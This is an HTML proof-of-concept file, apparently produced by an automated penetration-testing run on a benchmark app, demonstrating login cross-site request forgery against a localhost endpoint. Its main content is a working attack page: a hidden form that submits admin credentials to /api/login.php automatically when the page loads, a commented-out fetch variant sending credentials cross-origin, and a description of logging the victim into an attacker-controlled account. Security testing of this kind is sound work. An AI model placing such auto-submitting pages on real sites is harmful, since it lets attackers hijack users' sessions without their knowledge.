<!-- 
POC: HTML-based CSRF attack demonstrating how a malicious webpage can force a user to authenticate to the login endpoint without their knowledge, exploiting the lack of CSRF protection.
Target: ./repo
Created: 2025-11-07T17:46:13.202Z
Session: benchmark-XBEN-069-24-mhp4ra0s

To test this POC:
1. Open this file in a web browser: file:///home/daytona/.pensar/executions/benchmark-XBEN-069-24-mhp4ra0s/pocs/poc_csrf_login_endpoint.html
2. Or serve it and navigate to the target application
3. Observe the vulnerability demonstration (e.g., XSS alert, CSRF execution)
-->

<!DOCTYPE html>
<html>
<head>
    <title>CSRF Attack - Login Endpoint</title>
</head>
<body>
    <h1>CSRF Attack Demonstration - Login Endpoint</h1>
    <p>This page demonstrates CSRF vulnerability on /api/login.php</p>
    
    <!-- Hidden form that auto-submits to login endpoint from attacker's origin -->
    <form id="csrf-form" action="http://localhost:8080/api/login.php" method="POST" style="display:none;">
        <input type="hidden" name="username" value="admin">
        <input type="hidden" name="password" value="test123">
    </form>
    
    <!-- Alternative: Using fetch API to send cross-origin request -->
    <script>
        console.log("CSRF Attack POC: Attempting to submit login form from different origin...");
        
        // Method 1: Hidden form auto-submit
        // This demonstrates CSRF because the login endpoint accepts POST requests 
        // from any origin without CSRF token validation
        document.getElementById('csrf-form').submit();
        
        // Method 2: Fetch API (would also work if credentials policy allows)
        /*
        fetch('http://localhost:8080/api/login.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: 'username=admin&password=test123',
            credentials: 'include'
        }).then(response => {
            console.log("CSRF request sent with status:", response.status);
        });
        */
    </script>
    
    <h2>Attack Description:</h2>
    <p>When a user visits this page from attacker.com, the hidden form automatically submits 
    to the login endpoint at localhost:8080/api/login.php. Since the endpoint lacks CSRF protection:</p>
    <ul>
        <li>No CSRF token validation is performed</li>
        <li>Origin header is not validated</li>
        <li>Referer header is not validated</li>
        <li>The request succeeds (HTTP 200)</li>
        <li>User is authenticated with attacker's credentials</li>
    </ul>
    
    <p><strong>Impact:</strong> The victim is now logged in as an account controlled by the attacker,
    enabling session hijacking or further exploitation.</p>
</body>
</html>